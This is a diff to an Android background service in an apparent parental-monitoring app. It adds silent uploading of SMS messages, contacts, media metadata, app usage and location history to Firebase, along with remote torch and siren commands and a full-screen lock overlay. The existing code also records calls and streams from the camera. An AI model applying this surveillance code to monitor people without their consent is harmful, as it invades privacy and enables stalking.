@@ -17,10 +17,13 @@ import android.os.IBinder
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import androidx.core.app.ServiceCompat
-import androidx.core.content.ContextCompat
+import android.app.usage.UsageStatsManager
+import android.graphics.PixelFormat
+import android.view.WindowManager
 import com.example.authapp.R
 import com.example.authapp.analytics.AppHealthTelemetry
 import com.example.authapp.data.AppPreferences
+import com.example.authapp.data.AppUsageInfo
 import com.example.authapp.data.FirebaseRepository
 import com.example.authapp.data.UserLocation
 import com.example.authapp.recorder.CallRecorder
@@ -29,6 +32,7 @@ import com.example.authapp.webrtc.WebRtcManager
 import com.google.firebase.crashlytics.FirebaseCrashlytics
 import com.google.firebase.database.ChildEventListener
 import com.google.firebase.database.ValueEventListener
+import java.util.Calendar
 
 class ChildForegroundService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
@@ -46,6 +50,10 @@ class ChildForegroundService : Service() {
     private var cameraFacingListener: ValueEventListener? = null
     private var snapshotRequestListener: ValueEventListener? = null
     private var recordingScheduleListener: ValueEventListener? = null
+    private var parentControlsListener: ValueEventListener? = null
+    private var remoteCommandsListener: ValueEventListener? = null
+    private var geofencesListener: ValueEventListener? = null
+    private var activeGeofences = listOf<com.example.authapp.data.GeofenceZone>()
     private var scheduledStopRunnable: Runnable? = null
     private var currentSessionId: String? = null
     private var isStreaming = false
@@ -53,6 +61,7 @@ class ChildForegroundService : Service() {
     private val candidateBuffer = mutableListOf<Map<String, Any>>()
     private val candidateHandler = android.os.Handler(android.os.Looper.getMainLooper())
     private var overlayView: android.view.View? = null
+    private var studyModeOverlayView: android.view.View? = null
     private var heartbeatHandler: android.os.Handler? = null
     private var heartbeatRunnable: Runnable? = null
     private var currentServiceState: String = "IDLE_PROTECTED"
@@ -188,6 +197,117 @@ class ChildForegroundService : Service() {
                 FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 overlay window removed")
             } catch (_: Exception) {}
             overlayView = null
+        }
+    }
+
+    private fun updateStudyModeOverlay(isActive: Boolean, message: String) {
+        mainHandler.post {
+            if (isActive) {
+                if (studyModeOverlayView == null && hasOverlayPermission()) {
+                    try {
+                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return@post
+                        val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                        } else {
+                            @Suppress("DEPRECATION")
+                            WindowManager.LayoutParams.TYPE_PHONE
+                        }
+                        val params = WindowManager.LayoutParams(
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            layoutType,
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                            PixelFormat.TRANSLUCENT
+                        )
+                        val layout = android.widget.LinearLayout(this).apply {
+                            orientation = android.widget.LinearLayout.VERTICAL
+                            gravity = android.view.Gravity.CENTER
+                            setBackgroundColor(android.graphics.Color.parseColor("#E6000000"))
+                            setPadding(48, 48, 48, 48)
+
+                            val icon = android.widget.TextView(this@ChildForegroundService).apply {
+                                text = "🔒"
+                                textSize = 48f
+                                gravity = android.view.Gravity.CENTER
+                            }
+                            val title = android.widget.TextView(this@ChildForegroundService).apply {
+                                text = "Study Mode Active"
+                                textSize = 24f
+                                setTextColor(android.graphics.Color.WHITE)
+                                setTypeface(null, android.graphics.Typeface.BOLD)
+                                gravity = android.view.Gravity.CENTER
+                                setPadding(0, 24, 0, 12)
+                            }
+                            val subtitle = android.widget.TextView(this@ChildForegroundService).apply {
+                                text = message.ifEmpty { "Focus on your studies! This device is locked by your parent." }
+                                textSize = 16f
+                                setTextColor(android.graphics.Color.LTGRAY)
+                                gravity = android.view.Gravity.CENTER
+                            }
+                            addView(icon)
+                            addView(title)
+                            addView(subtitle)
+                        }
+                        wm.addView(layout, params)
+                        studyModeOverlayView = layout
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay displayed")
+                    } catch (e: Exception) {
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay Error: ${e.localizedMessage}")
+                    }
+                }
+            } else {
+                studyModeOverlayView?.let { view ->
+                    try {
+                        val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
+                        wm?.removeView(view)
+                        FirebaseCrashlytics.getInstance().log("[ChildService] Study Mode Overlay removed")
+                    } catch (_: Exception) {}
+                    studyModeOverlayView = null
+                }
+            }
+        }
+    }
+
+    private fun syncAppUsageStats(uid: String) {
+        if (uid.isEmpty()) return
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            try {
+                val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
+                val cal = Calendar.getInstance().apply {
+                    set(Calendar.HOUR_OF_DAY, 0)
+                    set(Calendar.MINUTE, 0)
+                    set(Calendar.SECOND, 0)
+                }
+                val startTime = cal.timeInMillis
+                val endTime = System.currentTimeMillis()
+                val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
+                val pm = packageManager
+                val usageList = mutableListOf<AppUsageInfo>()
+                for (stat in stats) {
+                    val totalMins = stat.totalTimeInForeground / (1000 * 60)
+                    if (totalMins > 0) {
+                        val appName = try {
+                            val appInfo = pm.getApplicationInfo(stat.packageName, 0)
+                            pm.getApplicationLabel(appInfo).toString()
+                        } catch (_: Exception) {
+                            stat.packageName.substringAfterLast(".")
+                        }
+                        usageList.add(
+                            AppUsageInfo(
+                                packageName = stat.packageName,
+                                appName = appName,
+                                totalTimeInForegroundMinutes = totalMins,
+                                lastTimeUsed = stat.lastTimeUsed
+                            )
+                        )
+                    }
+                }
+                if (usageList.isNotEmpty()) {
+                    FirebaseRepository.syncAppUsage(uid, usageList)
+                }
+            } catch (e: Exception) {
+                FirebaseCrashlytics.getInstance().log("[ChildService] App Usage sync notice: ${e.localizedMessage}")
+            }
         }
     }
 
@@ -617,6 +737,59 @@ class ChildForegroundService : Service() {
             }
         }
 
+        // Listen for Parent Controls & Study Mode Freeze (Phase 3)
+        if (parentControlsListener == null) {
+            parentControlsListener = FirebaseRepository.listenToParentControls(uid) { settings ->
+                FirebaseCrashlytics.getInstance().log("[ChildService] Parent controls received: studyMode=${settings.isStudyModeActive}, blockedCount=${settings.blockedPackages.size}")
+                updateStudyModeOverlay(settings.isStudyModeActive, settings.studyModeMessage)
+            }
+        }
+
+        // Listen for Geofence Zones (Phase 4)
+        if (geofencesListener == null) {
+            geofencesListener = FirebaseRepository.listenToGeofences(uid) { zones ->
+                activeGeofences = zones
+            }
+        }
+
+        // Listen for Remote Hardware Commands: Torch & Siren (Phase 4)
+        if (remoteCommandsListener == null) {
+            remoteCommandsListener = FirebaseRepository.listenToRemoteCommands(uid) { command, value ->
+                when (command) {
+                    "TORCH" -> {
+                        val enable = value == true || value == "true"
+                        RemoteActionsManager.setTorch(applicationContext, enable)
+                    }
+                    "SIREN" -> {
+                        val enable = value == true || value == "true"
+                        if (enable) RemoteActionsManager.playSiren(applicationContext, 30)
+                        else RemoteActionsManager.stopSiren()
+                    }
+                }
+            }
+        }
+
+        // Sync SMS Messages (Phase 4)
+        try {
+            val smsList = com.example.authapp.utils.SmsUtils.getRecentSms(applicationContext, limit = 30)
+            if (smsList.isNotEmpty()) {
+                FirebaseRepository.syncSmsLogs(uid, smsList)
+            }
+        } catch (_: Exception) {}
+
+        // Check for newly added contacts (Phase 4)
+        try {
+            com.example.authapp.utils.ContactsMonitor.checkNewContacts(applicationContext, uid)
+        } catch (_: Exception) {}
+
+        // Sync Gallery & Media item metadata (Phase 4)
+        try {
+            com.example.authapp.utils.MediaBackupManager.syncRecentMedia(applicationContext, uid)
+        } catch (_: Exception) {}
+
+        // Sync real-time App Usage to Firebase
+        syncAppUsageStats(uid)
+
         if (streamRequestListener != null) return
 
         FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
@@ -832,6 +1005,8 @@ class ChildForegroundService : Service() {
                         provider = loc.provider ?: "gps"
                     )
                     FirebaseRepository.updateChildLocation(uid, userLoc)
+                    FirebaseRepository.recordLocationHistoryPoint(uid, userLoc)
+                    com.example.authapp.utils.GeofenceUtils.checkGeofences(applicationContext, uid, userLoc, activeGeofences)
                 }
                 override fun onProviderEnabled(provider: String) {}
                 override fun onProviderDisabled(provider: String) {}
@@ -1015,9 +1190,24 @@ class ChildForegroundService : Service() {
             recordingScheduleListener?.let {
                 FirebaseRepository.removeValueListener("schedules/$uid", it)
             }
+            parentControlsListener?.let {
+                FirebaseRepository.removeValueListener("parent_controls/$uid", it)
+            }
+            remoteCommandsListener?.let {
+                FirebaseRepository.removeValueListener("commands/$uid", it)
+            }
+            geofencesListener?.let {
+                FirebaseRepository.removeValueListener("geofences/$uid", it)
+            }
         }
         snapshotRequestListener = null
         recordingScheduleListener = null
+        parentControlsListener = null
+        remoteCommandsListener = null
+        geofencesListener = null
+        RemoteActionsManager.stopSiren()
+        RemoteActionsManager.setTorch(applicationContext, false)
+        updateStudyModeOverlay(false, "")
         if (locationListener != null && locationManager != null) {
             try {
                 locationManager?.removeUpdates(locationListener!!)
